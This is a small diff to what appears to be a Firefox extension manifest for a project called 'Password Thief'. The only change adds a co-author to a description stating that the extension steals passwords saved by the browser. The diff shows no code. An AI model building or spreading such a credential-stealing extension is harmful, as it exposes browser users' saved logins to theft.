@@ -3,7 +3,7 @@
 	"name" : "Password Thief",
 	"version" : "1.0.1",
 
-	"description" : "a firefox extension that steals passwords saved by your browser by petitcroco",
+	"description" : "a firefox extension that steals passwords saved by your browser by petitcroco and the magic bogoss B3rt1ng",
 
 	"icons" : {
 		"128" : "logo.png"
